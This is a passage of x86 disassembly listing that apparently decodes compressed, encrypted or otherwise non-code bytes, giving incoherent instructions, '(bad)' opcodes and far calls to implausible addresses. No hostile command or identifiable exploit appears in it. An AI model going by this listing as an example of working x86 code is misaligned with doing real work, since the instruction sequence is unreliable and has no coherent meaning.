  4155fc:	retf   0x22e7
  4155ff:	add    edx,DWORD PTR [edx]
  415601:	lds    esp,FWORD PTR [edx+0x52]
  415604:	or     BYTE PTR fs:0x421fc970,dh
  41560b:	xchg   esi,eax
  41560c:	cmc    
  41560d:	out    0xcc,eax
  41560f:	mov    edi,0x91f288d
  415614:	call   0xabea1793
  415619:	xor    al,BYTE PTR [ebp+0x69473250]
  41561f:	push   0x75f1e45b
  415624:	push   ebp
  415625:	jnp    0x41562b
  415627:	xchg   BYTE PTR [ebx],dh
  415629:	inc    ebp
  41562a:	ins    DWORD PTR es:[edi],dx
  41562b:	sub    esi,DWORD PTR [ebp+0x7a]
  41562e:	sub    ah,BYTE PTR [ebx-0x45]
  415631:	dec    esp
  415632:	or     al,0xc8
  415634:	push   ebx
  415635:	je     0x41569e
  415637:	push   edx
  415638:	inc    edi
  415639:	dec    eax
  41563a:	in     al,dx
  41563b:	sbb    al,0xce
  41563d:	repz or dh,dl
  415640:	push   cs
  415641:	adc    eax,0x7d17a319
  415646:	add    eax,0x1fb1e67a
  41564b:	sub    bh,BYTE PTR [ecx]
  41564d:	cli    
  41564e:	inc    ebp
  41564f:	xchg   BYTE PTR [edi-0x622913f5],ch
  415655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415656:	dec    edi
  415657:	and    DWORD PTR [ebx+0x5b8741f2],edx
  41565d:	aam    0xa1
  41565f:	pop    es
  415660:	cli    
  415661:	pop    ebp
  415662:	mov    esp,0x926ae241
  415667:	add    BYTE PTR [edi-0x1a],dh
  41566a:	or     bh,BYTE PTR [eax+0x59]
  41566d:	cmp    eax,0xe8184630
  415672:	sub    ah,BYTE PTR [edi]
  415674:	ror    esp,0xb8
  415677:	xor    DWORD PTR [edx+ebx*4+0x48],ecx
  41567b:	addr16 sub al,0x0
  41567e:	test   al,0x54
  415680:	imul   ecx,DWORD PTR [edx-0x5e],0x5a
  415684:	aad    0xad
  415686:	stos   BYTE PTR es:[edi],al
  415687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415688:	pop    edx
  415689:	pop    ds
  41568a:	rcr    DWORD PTR [eax+0x27cb49d],cl
  415690:	nop
  415691:	sub    DWORD PTR [eax],edi
  415693:	jne    0x415671
  415695:	stos   BYTE PTR es:[edi],al
  415696:	pop    edx
  415697:	in     al,dx
  415698:	pop    ebx
  415699:	adc    DWORD PTR [edx-0x25],esp
  41569c:	addr16 pop ds
  41569e:	pop    ebx
  41569f:	mov    ebx,0x4355fe01
  4156a4:	imul   eax,DWORD PTR [edi+0x4c],0xffffff91
  4156a8:	lods   al,BYTE PTR ds:[esi]
  4156a9:	cmc    
  4156aa:	cmp    dl,BYTE PTR [ecx+eiz*1-0x49a510b1]
  4156b1:	cs (bad) 
  4156b3:	aam    0x68
  4156b5:	jbe    0x41571c
  4156b7:	test   eax,0x9b6ae6e6
  4156bc:	fdivr  QWORD PTR [ebx-0x43445e28]
  4156c2:	cmp    eax,0x2af9a405
  4156c7:	dec    edx
  4156c8:	test   BYTE PTR [ecx+0xf],bl
  4156cb:	push   ebp
  4156cc:	retf   0x94b7
  4156cf:	frstor [edx]
  4156d1:	call   0xd9d77c62
  4156d6:	lods   eax,DWORD PTR ds:[esi]
  4156d7:	mov    ecx,DWORD PTR [eax]
  4156d9:	push   esp
  4156da:	cmp    bl,BYTE PTR [esi-0x28ae9912]
  4156e0:	imul   ebp,DWORD PTR ds:0x148f55a0,0xd03ab37b
  4156ea:	scas   al,BYTE PTR es:[edi]
  4156eb:	je     0x4156ab
  4156ed:	and    DWORD PTR [edx],0xffffffce
  4156f0:	mov    edi,DWORD PTR [edx+0x62944e7f]
  4156f6:	mov    bl,0xfe
  4156f8:	retf   0x34e2
  4156fb:	xor    al,0x47
  4156fd:	dec    ecx
  4156fe:	fs cmc 
  415700:	test   eax,0xd3bb9535
  415705:	sar    BYTE PTR [ecx+0x2eea23eb],1
  41570b:	jbe    0x41574f
  41570d:	dec    ecx
  41570e:	jo     0x4156e8
  415710:	push   ss
  415711:	dec    ecx
  415712:	test   al,0x7c
  415714:	mov    eax,esp
  415716:	sub    ecx,DWORD PTR [esi-0x5e]
  415719:	(bad)  
  41571a:	pop    ds
  41571b:	jo     0x4156a3
  41571d:	(bad)  
  41571e:	xchg   esi,eax
  41571f:	adc    eax,0x16aa3a5b
  415724:	fcomp  QWORD PTR [ebp-0x2f]
  415727:	xchg   ebx,eax
  415728:	div    edi
  41572a:	sar    ebx,0x4e
  41572d:	and    ah,bl
  41572f:	push   ss
  415730:	jbe    0x4156c7
  415732:	sub    al,0x4f
  415734:	xor    esp,edx
  415736:	xor    ch,ch
  415738:	fwait
  415739:	in     al,dx
  41573a:	mov    bl,0xd9
  41573c:	or     ebp,ebp
  41573e:	mov    esi,0x67c9cd01
  415743:	cmp    al,0x28
  415745:	sbb    eax,0x2918127b
  41574a:	and    eax,0xd120fa34
  41574f:	(bad)  
  415750:	add    ebx,DWORD PTR [edi+0x6d]
  415753:	jae    0x4157c1
  415755:	sahf   
  415756:	add    BYTE PTR [edx],al
  415758:	jb     0x4157c1
  41575a:	cli    
  41575b:	pop    ds
  41575c:	or     DWORD PTR [ebx+0x6d37e6aa],eax
  415762:	or     BYTE PTR [eax+0x4be38e8],bl
  415768:	or     sp,WORD PTR [ecx+0x5d]
  41576c:	and    BYTE PTR [edx-0x5b2dd85c],al
  415772:	inc    edx
  415773:	xor    bl,bl
  415775:	ja     0x41577a
  415777:	xchg   esp,eax
  415778:	jae    0x415700
  41577a:	jecxz  0x415797
  41577c:	push   0xffffffbc
  41577e:	dec    edi
  41577f:	adc    al,0x78
  415781:	mov    ah,0x75
  415783:	push   esi
  415784:	dec    esp
  415785:	fld    DWORD PTR ss:[ebx-0x606efe52]
  41578c:	sbb    DWORD PTR [esi+0x3d],eax
  41578f:	popf   
  415790:	add    eax,0xb6b18e47
  415795:	mov    ebx,0xdf312f75
  41579a:	xor    BYTE PTR [edi+eiz*2],0xcd
  41579e:	adc    eax,0xc9b49321
  4157a3:	inc    edx
  4157a4:	mov    al,ds:0x998147a7
  4157a9:	(bad)  
  4157aa:	mov    al,0x7e
  4157ac:	adc    eax,0x91fcc917
  4157b1:	add    DWORD PTR [edx+0x78],eax
  4157b4:	add    eax,0xd6eec229
  4157b9:	inc    ebp
  4157ba:	and    ah,BYTE PTR [eax-0x57bde999]
  4157c0:	outs   dx,BYTE PTR ds:[esi]
  4157c1:	sub    al,0x4f
  4157c3:	push   ss
  4157c4:	and    esi,ebx
  4157c6:	jb     0x41574b
  4157c8:	add    al,0x10
  4157ca:	aad    0x3d
  4157cc:	sub    edi,esi
  4157ce:	aad    0xda
  4157d0:	int3   
  4157d1:	xor    ax,0xcca4
  4157d5:	add    BYTE PTR [edx],ch
  4157d7:	nop
  4157d8:	add    BYTE PTR [esi+0x4b0665aa],cl
  4157de:	ins    DWORD PTR es:[edi],dx
  4157df:	xor    edi,ebx
  4157e1:	sbb    al,0xa4
  4157e3:	jne    0x4157b9
  4157e5:	push   edi
  4157e6:	and    eax,0x41445b0e
  4157eb:	arpl   WORD PTR [edx+0x33],di
  4157ee:	xchg   edi,eax
  4157ef:	mov    al,0xf7
  4157f1:	adc    al,0xe1
  4157f3:	pop    ebp
  4157f4:	sub    al,0x73
  4157f6:	retf   0x89b8
  4157f9:	call   0x681d:0x586be4f4
  415800:	sti    
  415801:	fwait
  415802:	inc    edx
  415803:	into   
  415804:	scas   eax,DWORD PTR es:[edi]
  415805:	shl    BYTE PTR [edi-0x20],cl
  415808:	mov    WORD PTR [esi+0xc],cs
  41580b:	pop    ebp
  41580c:	and    eax,0x79f03672
  415811:	push   edi
  415812:	and    BYTE PTR [ebx-0x1c],ch
  415815:	call   0xae1a169c
  41581a:	in     al,0x53
  41581c:	add    al,0x5d
  41581e:	xor    al,0x23
  415820:	test   al,0x23
  415822:	test   al,0x84
  415824:	aad    0x74
  415826:	push   esi
  415827:	push   ebp
  415828:	ret    
  415829:	sbb    al,0xdb
  41582b:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41582d:	sbb    eax,0xf7668c3d
  415832:	repnz int 0x9c
  415835:	mov    ebp,0xc3545ea1
  41583a:	(bad)  
  41583b:	sub    BYTE PTR [esi+0x2e],dh
  41583e:	mov    BYTE PTR [ecx+0x2b],dh
  415841:	icebp  
  415842:	ds push ss
  415844:	fsubr  DWORD PTR [esp+edx*8]
  415847:	push   esi
  415848:	or     al,0xee
  41584a:	jno    0x4157f4
  41584c:	pop    ebp
  41584d:	adc    al,0x58
  41584f:	jno    0x4158ba
  415851:	or     BYTE PTR [edx+0x390b7019],bh
  415857:	mov    al,0x53
  415859:	pop    esi
  41585a:	sbb    al,0x0
  41585c:	loop   0x415867
  41585e:	test   al,0xa9
  415860:	jmp    0xbe03:0x25247cc5
  415867:	call   0xdc4a:0x78ef6c79
  41586e:	out    0x9d,eax
  415870:	and    BYTE PTR [ebx],bl
  415872:	mov    dh,0xfe
  415874:	push   0x239fae9f
  415879:	pop    es
  41587a:	mov    ds:0xaec43687,eax
  41587f:	(bad)  [edx-0x52]
  415882:	pop    ecx
  415883:	mov    ds:0x49ce0035,al
  415888:	dec    esi
  415889:	inc    DWORD PTR [eax+eiz*1]
  41588c:	push   esi
  41588d:	out    dx,al
  41588e:	arpl   WORD PTR [edi-0x7b],bp
  415891:	jge    0x4158e8
  415893:	pop    esp
  415894:	dec    esi
  415895:	mov    esp,0x8f241003
  41589a:	js     0x4158dd
  41589c:	es pop ebp
  41589f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158a0:	xchg   edi,eax
  4158a1:	push   cs
  4158a2:	mov    eax,edi
  4158a4:	pushf  
  4158a5:	mov    al,0x30
  4158a7:	cmp    DWORD PTR [ebx],edx
  4158a9:	sahf   
  4158aa:	xor    ecx,DWORD PTR [eax*4-0x16687581]
  4158b1:	scas   al,BYTE PTR es:[edi]
  4158b2:	mov    esp,0x624ff4f3
  4158b7:	adc    ebx,0x468b7a76
  4158bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158be:	lods   al,BYTE PTR ds:[esi]
  4158bf:	sub    eax,0xd7b51c87
  4158c4:	push   esp
  4158c5:	sbb    BYTE PTR [ebx+0x1a3dd5bf],0xdc
  4158cc:	sbb    esp,0x66c97fba
  4158d2:	mov    ebx,0xa1004e51
  4158d7:	mov    ds:0x8ac91388,al
  4158dc:	push   eax
  4158dd:	in     al,dx
  4158de:	mov    BYTE PTR [ecx+0x2bb87fab],dh
  4158e4:	jmp    0x41588e
  4158e6:	mov    bl,0xdb
  4158e8:	xchg   ebp,eax
  4158e9:	test   DWORD PTR [ecx-0x3edd6737],ebx
  4158ef:	add    eax,0xe9b4608c
  4158f4:	fs sub al,0x1f
  4158f7:	je     0x415928
  4158f9:	ins    DWORD PTR es:[edi],dx
  4158fa:	iret   
  4158fb:	jge    0x415891
  4158fd:	fild   WORD PTR [ebp+esi*1+0x25234556]
  415904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415905:	adc    al,cl
  415907:	xor    dl,BYTE PTR [edi+0xb]
  41590a:	mov    al,0x66
  41590c:	fcmovnb st,st(1)
  41590e:	and    eax,0x9115b220
  415913:	jb     0x415994
  415915:	mov    ebp,0x5b33d5b4
  41591a:	xchg   ecx,eax
  41591b:	jmp    DWORD PTR [ebx-0x48]
  41591e:	dec    eax
  41591f:	xor    al,0xc4
  415921:	int3   
  415922:	retf   
  415923:	je     0x4158dd
  415925:	test   DWORD PTR [eax-0x7c6e671e],0xdadbaa44
  41592f:	xchg   esi,eax
  415930:	sahf   
  415931:	or     bh,cl
  415933:	xlat   BYTE PTR ds:[ebx]
  415934:	sahf   
  415935:	popf   
  415936:	adc    al,0x7
  415938:	xchg   esi,eax
  415939:	es push ecx
  41593b:	adc    ebp,esp
  41593d:	xor    dh,ah
  41593f:	(bad)  
  415940:	and    DWORD PTR [ebp-0x614e8e03],eax
  415946:	shl    DWORD PTR [ecx],0x1
  415949:	mov    ecx,0xadf10d53
  41594e:	fsub   st,st(2)
  415950:	add    dl,BYTE PTR [ebx+0x63]
  415953:	xor    al,0xee
  415955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415956:	jecxz  0x415984
  415958:	ss pusha 
  41595a:	cmp    esi,DWORD PTR [esi+0x27]
  41595d:	je     0x415907
  41595f:	cs jp  0x41592f
  415962:	cmp    al,0xcd
  415964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415965:	js     0x415937
  415967:	fwait
  415968:	outs   dx,BYTE PTR ds:[esi]
  415969:	inc    ebx
  41596a:	aad    0xde
  41596c:	mov    bl,0x3e
  41596e:	inc    edx
  41596f:	leave  
  415970:	fwait
  415971:	mov    ds:0xe93f36c,al
  415976:	dec    ecx
  415977:	jbe    0x4159bb
  415979:	repnz gs sar esp,1
  41597d:	aam    0xb5
  41597f:	jb     0x4159f6
  415981:	or     eax,edi
  415983:	and    dl,al
  415985:	clc    
  415986:	cld    
  415987:	(bad)  [ebx+esi*8+0x503b953f]
  41598e:	dec    esi
  41598f:	dec    ecx
  415990:	stos   DWORD PTR es:[edi],eax
  415991:	jg     0x4159dd
  415993:	aad    0xc0
  415995:	dec    eax
  415996:	hlt    
  415997:	ins    BYTE PTR es:[edi],dx
  415998:	jbe    0x415a15
  41599a:	mov    ah,0xd4
  41599c:	pop    es
  41599d:	pop    ebx
  41599e:	jno    0x4159b5
  4159a0:	outs   dx,DWORD PTR ds:[esi]
  4159a1:	clc    
  4159a2:	xor    BYTE PTR [edx-0x617e5cd7],bl
  4159a8:	inc    ecx
  4159a9:	mov    dh,0xfa
  4159ab:	(bad)  
  4159ac:	hlt    
  4159ad:	add    DWORD PTR [ecx],edi
  4159af:	fld    TBYTE PTR [ebx-0x34]
  4159b2:	mov    ah,0x41
  4159b4:	ja     0x41599b
  4159b6:	cli    
  4159b7:	pop    edx
  4159b8:	dec    ecx
  4159b9:	lds    ecx,FWORD PTR [edi]
  4159bb:	in     al,dx
  4159bc:	call   0xcebb:0xdffca5b3
  4159c3:	sub    DWORD PTR [edx+0x72],ecx
  4159c6:	aam    0x38
  4159c8:	dec    ebp
  4159c9:	mov    ah,0x7a
  4159cb:	jl     0x415a1b
  4159cd:	push   esi
  4159ce:	and    BYTE PTR [edi+0x6482b513],dh
  4159d4:	jno    0x415a3c
  4159d6:	and    cl,bh
  4159d8:	xchg   ecx,eax
  4159d9:	add    DWORD PTR [ebx],ebp
  4159db:	aas    
  4159dc:	(bad)  
  4159dd:	(bad)  [ebp-0x735cd558]
  4159e3:	shl    DWORD PTR [eax],0x2f
  4159e6:	jae    0x415978
  4159e8:	rcl    BYTE PTR [eax+0x263aba1],0x98
  4159ef:	scas   al,BYTE PTR es:[edi]
  4159f0:	imul   esi,DWORD PTR [edx+0x737bcfe1],0x21
  4159f7:	std    
  4159f8:	sub    ch,0x19
  4159fb:	mov    ebx,DWORD PTR [eax-0x23]
  4159fe:	in     al,0x37
  415a00:	repnz sbb al,0x47
  415a03:	pop    ds
  415a04:	mov    ecx,0xce20cf0d
  415a09:	in     al,0x8
  415a0b:	ja     0x415a59
  415a0d:	pop    esi
  415a0e:	mov    ebp,0x62fe9bb
  415a13:	imul   edi,DWORD PTR [edi-0x68],0x851abdd1
  415a1a:	adc    BYTE PTR [edi],ch
  415a1c:	js     0x415a32
  415a1e:	lea    ebp,[ebx-0x7]
  415a21:	push   esp
  415a22:	pop    es
  415a23:	push   ds
  415a24:	xor    BYTE PTR ds:[ebp+0x14d73126],dl
  415a2b:	adc    al,0xb5
  415a2d:	xor    eax,0xde0c3b66
  415a32:	dec    eax
  415a33:	ja     0x415a86
  415a35:	xchg   ecx,eax
  415a36:	inc    ebp
  415a37:	xchg   edi,eax
  415a38:	shl    DWORD PTR [ebp+0x15cc9df7],cl
  415a3e:	push   edx
  415a3f:	daa    
  415a40:	jb     0x415a29
  415a42:	and    DWORD PTR [edx+ebx*2-0x3a00172e],edx
  415a49:	cmp    BYTE PTR [ebx+edi*1],cl
  415a4c:	xchg   edi,eax
  415a4d:	and    DWORD PTR [ecx-0x60098d57],ebp
  415a53:	stos   BYTE PTR es:[edi],al
  415a54:	sti    
  415a55:	mov    ebx,0xf3dd24dc
  415a5a:	inc    esi
  415a5b:	mov    dl,0x6c
  415a5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a5e:	out    0xbc,eax
  415a60:	mov    ebx,0xa7a2260d
  415a65:	cmp    DWORD PTR [edi+0x78726c5d],0xa34fee8c
  415a6f:	xchg   esi,eax
  415a70:	retf   0xcc89
  415a73:	arpl   WORD PTR [edi-0x1c554721],bp
  415a79:	inc    ebp
  415a7a:	lea    eax,[edi]
  415a7c:	and    esi,ecx
  415a7e:	and    eax,0xa8ca8ebc
  415a83:	xchg   edx,eax
  415a84:	mov    bl,0xbb
  415a86:	mov    bh,BYTE PTR [esi]
  415a88:	pop    es
  415a89:	sar    DWORD PTR [edi+0x75d34a8a],0x5f
  415a90:	add    al,0x2a
  415a92:	cld    
  415a93:	cdq    
  415a94:	loope  0x415afe
  415a96:	fcomp  QWORD PTR ds:0x6a0fc1b3
  415a9c:	std    
  415a9d:	sbb    bl,BYTE PTR [ecx+0x6084343f]
  415aa3:	cmp    edi,esp
  415aa5:	xlat   BYTE PTR ds:[ebx]
  415aa6:	sti    
  415aa7:	dec    edx
  415aa8:	inc    ebp
  415aa9:	pop    edi
  415aaa:	or     dh,bl
  415aac:	fbstp  TBYTE PTR [esi+ebx*2-0x19]
  415ab0:	fwait
  415ab1:	(bad)  
  415ab2:	and    eax,ecx
  415ab4:	or     DWORD PTR [edi-0x74],esi
  415ab7:	cs dec edx
  415ab9:	cs push ds
  415abb:	jne    0x415b23
  415abd:	aam    0xbb
  415abf:	dec    esi
  415ac0:	enter  0xb481,0x18
  415ac4:	xor    cl,al
  415ac6:	xchg   esi,eax
  415ac7:	lea    ecx,[ebx]
  415ac9:	adc    eax,0xe5c0a438
  415ace:	mov    esp,0x60e2b91d
  415ad3:	sbb    cl,BYTE PTR [edx]
  415ad5:	popa   
  415ad6:	shr    DWORD PTR [eax+ecx*1+0x23],0x12
  415adb:	dec    BYTE PTR [ecx+eax*1-0x40990e52]
  415ae2:	mov    ds:0xa38d6a36,eax
  415ae7:	jns    0x415a8e
  415ae9:	push   0x33
  415aeb:	push   dx
  415aed:	and    al,0x37
  415aef:	aam    0xad
  415af1:	enter  0x4c81,0x35
  415af5:	fdivr  DWORD PTR [ecx+0x5bab83e]
  415afb:	fild   QWORD PTR [ebp-0x7e]
  415afe:	sub    BYTE PTR [ecx+0xb20b34a],dl
  415b04:	int    0xc2
  415b06:	and    dl,BYTE PTR [ebp-0x4286affe]
  415b0c:	lea    eax,[edi+ebx*4]
  415b0f:	mov    ecx,0x16ca4fef
  415b14:	and    edi,DWORD PTR [eax]
  415b16:	pop    edx
  415b17:	rol    DWORD PTR [ecx-0x2b],0xad
  415b1b:	cs cs jg 0x415ab0
  415b1f:	rcl    DWORD PTR [ebx+0x10],cl
  415b22:	push   0xa45fe63
  415b27:	mov    dh,0x9c
  415b29:	pushf  
  415b2a:	bsr    ebx,edi
  415b2d:	rcr    DWORD PTR [edx],0x7c
  415b30:	test   eax,0xf8c0b25
  415b35:	and    cl,cl
  415b37:	test   al,0x95
  415b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b3a:	xor    cl,cl
  415b3c:	or     al,0x73
  415b3e:	sub    al,0x1a
  415b40:	adc    al,0x8a
  415b42:	cli    
  415b43:	mov    bl,0x6
  415b45:	data16 test al,0x32
  415b48:	pushf  
  415b49:	je     0x415af4
  415b4b:	mov    dh,0xad
  415b4d:	pop    ebp
  415b4e:	adc    DWORD PTR [edi+0x3e30e1ca],eax
  415b54:	lods   al,BYTE PTR ds:[esi]
  415b55:	add    ah,BYTE PTR [ebx-0x6d4a551f]
  415b5b:	and    al,0xdd
  415b5d:	(bad)  
  415b5e:	ss inc eax
  415b60:	dec    edi
  415b61:	and    esi,esp
  415b63:	mov    DWORD PTR [ecx],0x7853531
  415b69:	(bad)  
  415b6a:	rol    DWORD PTR [edx+eiz*4+0x198a4847],cl
  415b71:	pop    es
  415b72:	push   esi
  415b73:	cmp    BYTE PTR [ecx],cl
  415b75:	ins    DWORD PTR es:[di],dx
  415b77:	fadd   QWORD PTR [esi+0x512951ce]
  415b7d:	mov    ebx,0xc1b52f8c
  415b82:	push   ss
  415b83:	les    esi,FWORD PTR [eax+0x42e25a7]
  415b89:	xchg   esp,eax
  415b8a:	not    dh
  415b8c:	push   ebx
  415b8d:	js     0x415b5e
  415b8f:	xchg   ebp,eax
  415b90:	jg     0x415b1d
  415b92:	mov    eax,ebx
  415b94:	outs   dx,DWORD PTR ds:[esi]
  415b95:	outs   dx,DWORD PTR ds:[esi]
  415b96:	add    BYTE PTR [edx+0x19e433a8],dl
  415b9c:	in     ax,dx
  415b9e:	pop    ebp
  415b9f:	mov    ebx,0x2068715b
  415ba4:	jecxz  0x415be1
  415ba6:	xchg   BYTE PTR [ecx+0x6e],al
  415ba9:	xchg   ebx,eax
  415baa:	fcmovu st,st(0)
  415bac:	scas   al,BYTE PTR es:[edi]
  415bad:	add    eax,0xf8e5895
  415bb2:	ret    0x1247
  415bb5:	add    DWORD PTR [edx+0x16],esp
  415bb8:	sti    
  415bb9:	push   ds
  415bba:	hlt    
  415bbb:	loope  0x415b84
  415bbd:	test   eax,0x3a503bba
  415bc2:	dec    edx
  415bc3:	pop    ds
  415bc4:	pop    eax
  415bc5:	das    
  415bc6:	sbb    DWORD PTR [ebx+ecx*2-0xb],0xeeecedb7
  415bce:	jl     0x415c29
  415bd0:	inc    edx
  415bd1:	cmp    eax,DWORD PTR [ebx+0x5b0e2960]
  415bd7:	cmp    eax,0xee96f72a
  415bdc:	outs   dx,DWORD PTR ds:[esi]
  415bdd:	leave  
  415bde:	test   DWORD PTR [edi+0x6c0ad0ff],0x88ca421a
  415be8:	dec    edx
  415be9:	loopne 0x415b9a
  415beb:	dec    ecx
  415bec:	cmp    BYTE PTR [ebp-0x5ec8fff2],ah
  415bf2:	xchg   edi,eax
  415bf3:	mov    DWORD PTR [esi+0x244f7bfd],esp
  415bf9:	call   0x32bdb379
  415bfe:	jmp    0x415c2a
  415c00:	dec    DWORD PTR [ebx]
  415c02:	aam    0x7a
  415c04:	imul   edx,DWORD PTR ds:0x7f644917,0xffffffc2
  415c0b:	ins    DWORD PTR es:[edi],dx
  415c0c:	aas    
  415c0d:	mov    edx,0xdfee0d0a
  415c12:	mov    al,0x9b
  415c14:	xchg   ecx,eax
  415c15:	(bad)  
  415c16:	fmul   DWORD PTR [edx]
  415c18:	stos   DWORD PTR es:[edi],eax
  415c19:	outs   dx,BYTE PTR ds:[esi]
  415c1a:	test   DWORD PTR [ebx],0x5cd6b65c
  415c20:	inc    esp
  415c21:	cmp    edx,DWORD PTR [esi+0x4f8f09d1]
  415c27:	xlat   BYTE PTR ds:[ebx]
  415c28:	inc    eax
  415c29:	cli    
  415c2a:	push   0x5917a5e2
  415c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c30:	mov    bh,0xe5
  415c32:	pusha  
  415c33:	ror    DWORD PTR [edx],0x89
  415c36:	popf   
  415c37:	push   esp
  415c38:	aad    0xb7
  415c3a:	ins    DWORD PTR es:[edi],dx
  415c3b:	sbb    ch,BYTE PTR [esi]
  415c3d:	int3   
  415c3e:	(bad)  
  415c3f:	jmp    0x415c59
  415c41:	mov    ds,WORD PTR [ebp-0x64b2892f]
  415c47:	pop    edx
  415c48:	ss in  al,dx
  415c4a:	dec    edi
  415c4b:	test   eax,0xd9ef48dd
  415c50:	out    dx,al
  415c51:	cwde   
  415c52:	in     eax,dx
  415c53:	mov    bh,0xb
  415c55:	in     al,dx
  415c56:	cmp    bl,BYTE PTR [ecx+0x26]
  415c59:	loopne 0x415cba
  415c5b:	cmp    DWORD PTR [esi-0x6d],esp
  415c5e:	shl    DWORD PTR [eax+0x1d36d855],0x4a
  415c65:	iret   
  415c66:	xchg   DWORD PTR [edx-0x4a13fbc7],esp
  415c6c:	adc    al,0xbc
  415c6e:	xor    esi,DWORD PTR [ecx+esi*2+0x2f53fa8d]
  415c75:	lock xlat BYTE PTR ds:[ebx]
  415c77:	sub    eax,DWORD PTR [esi+0x0]
  415c7a:	ins    BYTE PTR es:[edi],dx
  415c7b:	xor    al,0xd5
  415c7d:	cmp    cl,BYTE PTR [esi+esi*2]
  415c80:	inc    ecx
  415c81:	pushf  
  415c82:	adc    eax,DWORD PTR [ebp+0x67]
  415c85:	mov    al,0xb6
  415c87:	fnsave [edx]
  415c89:	ffreep st(4)
  415c8b:	aas    
  415c8c:	jo     0x415cdb
  415c8e:	rcl    al,1
  415c90:	inc    ecx
  415c91:	not    ch
  415c93:	pop    ebx
  415c94:	daa    
  415c95:	or     DWORD PTR ds:0x1d5455ef,esp
  415c9b:	test   BYTE PTR [eax+eax*2+0x7aee8e93],bh
  415ca2:	les    edi,FWORD PTR [ebp+0x1]
  415ca5:	adc    al,ah
  415ca7:	adc    al,0xda
  415ca9:	test   al,0x8c
  415cab:	cmovne ebp,DWORD PTR [ebx+0x3c56fc4e]
  415cb2:	shl    DWORD PTR [ecx+0x2c2044bb],1
  415cb8:	push   ss
  415cb9:	call   0x46d3:0xa1a8a553
  415cc0:	into   
  415cc1:	cs pop es
  415cc3:	mov    cl,0xec
  415cc5:	sub    DWORD PTR [ebp+0x22ce33c],0x7d0f54b4
  415ccf:	rcr    DWORD PTR [edi+0x77],0x6c
  415cd3:	xchg   esp,eax
  415cd4:	xchg   edi,eax
  415cd5:	fwait
  415cd6:	dec    eax
  415cd7:	lods   eax,DWORD PTR ds:[esi]
  415cd8:	fcmovne st,st(5)
  415cda:	mov    al,0x3f
  415cdc:	hlt    
  415cdd:	or     ebx,DWORD PTR [edi+0x40]
  415ce0:	mov    ecx,0xd398a5fb
  415ce5:	cmp    bl,ah
  415ce7:	xlat   BYTE PTR ds:[ebx]
  415ce8:	div    DWORD PTR [ecx+0x6e09e38f]
  415cee:	cmp    eax,0x3aa00d4
  415cf3:	inc    eax
  415cf4:	addr16 dec ebp
  415cf6:	js     0x415d32
  415cf8:	push   0xffffffa8
  415cfa:	ins    BYTE PTR es:[edi],dx
  415cfb:	(bad)  
  415cfc:	jecxz  0x415c88
  415cfe:	dec    ebx
  415cff:	sub    DWORD PTR [eax-0x7e23d0d0],edi
  415d05:	jmp    0x98b18531
  415d0a:	fmulp  st(4),st
  415d0c:	fadd   DWORD PTR [eax-0x61f81964]
  415d12:	fisttp QWORD PTR [esi-0x271a6a3c]
  415d18:	or     BYTE PTR [edi],dh
  415d1a:	sbb    cl,BYTE PTR [eax]
  415d1c:	adc    ebp,DWORD PTR [ebx+0x7b]
  415d1f:	dec    edi
  415d20:	push   ecx
  415d21:	jecxz  0x415ceb
  415d23:	sahf   
  415d24:	and    dh,BYTE PTR ds:0xe0e5550d
  415d2a:	lea    edi,ds:0x5b99a27
  415d30:	(bad)  
  415d31:	cdq    
  415d32:	mov    ?,WORD PTR [ecx]
  415d34:	call   0x433e:0x4f74833d
  415d3b:	(bad)  
  415d3c:	mov    dl,0x63
  415d3e:	or     DWORD PTR [ebx],esp
  415d40:	aas    
  415d41:	xchg   edi,eax
  415d42:	ja     0x415cce
  415d44:	ins    DWORD PTR es:[edi],dx
  415d45:	fstp   DWORD PTR [edx+0x64]
  415d48:	js     0x415dc3
  415d4a:	cmp    DWORD PTR [ecx+0x5c],ebx
  415d4d:	mov    ebp,0xbfec719f
  415d52:	ins    DWORD PTR es:[edi],dx
  415d53:	cs pop ecx
  415d55:	push   ebp
  415d56:	ficomp DWORD PTR [ebx-0x2892ab8a]
  415d5c:	shr    DWORD PTR [edi+0x36560f55],0xa5
  415d63:	adc    BYTE PTR [esi-0x62],cl
  415d66:	in     al,0xb8
  415d68:	pop    esi
  415d69:	or     DWORD PTR [eax],ebp
  415d6b:	push   0x41
  415d6d:	mov    ebp,0xc28451a4
  415d72:	cs or  eax,0xd4ec5464
  415d78:	call   0xdcd2e680
  415d7d:	dec    ecx
  415d7e:	or     DWORD PTR [eax+0x4f],ecx
  415d81:	dec    esi
  415d82:	mov    bl,0xcb
  415d84:	xor    eax,0xb8f423c
  415d89:	imul   ebp,DWORD PTR [ecx],0x37
  415d8c:	dec    esp
  415d8d:	mov    al,ds:0x6c347725
  415d92:	cmp    BYTE PTR [edx],dl
  415d94:	pop    edi
  415d95:	mov    ebx,DWORD PTR [ebx+edx*4-0x49]
  415d99:	inc    edi
  415d9a:	leave  
  415d9b:	icebp  
  415d9c:	adc    esi,DWORD PTR [ecx]
  415d9e:	call   FWORD PTR [edi]
  415da0:	mov    ax,0x1508
  415da4:	cmp    BYTE PTR [edi-0x50],0xb9
  415da8:	stos   DWORD PTR es:[edi],eax
  415da9:	call   0x4436:0x90a64362
  415db0:	xchg   DWORD PTR [ebp+0x44a33e6b],ebp
  415db6:	pushf  
  415db7:	adc    eax,0xe15c347f
  415dbc:	adc    edi,DWORD PTR [ebp+0x3a]
  415dbf:	dec    edi
  415dc0:	add    al,0xe1
  415dc2:	call   0x356ea3c4
  415dc7:	pop    ebx
  415dc8:	dec    ebx
  415dc9:	cmp    BYTE PTR [esi-0x5b],0x79
  415dcd:	pop    eax
  415dce:	adc    esi,esi
  415dd0:	mov    dl,0xed
  415dd2:	fcom   QWORD PTR [esp+edx*8-0x24e3b654]
  415dd9:	xor    ecx,DWORD PTR [esi+0xb5e970]
  415ddf:	ret    0x1bf7
  415de2:	push   es
  415de3:	jmp    0x415e18
  415de5:	dec    edi
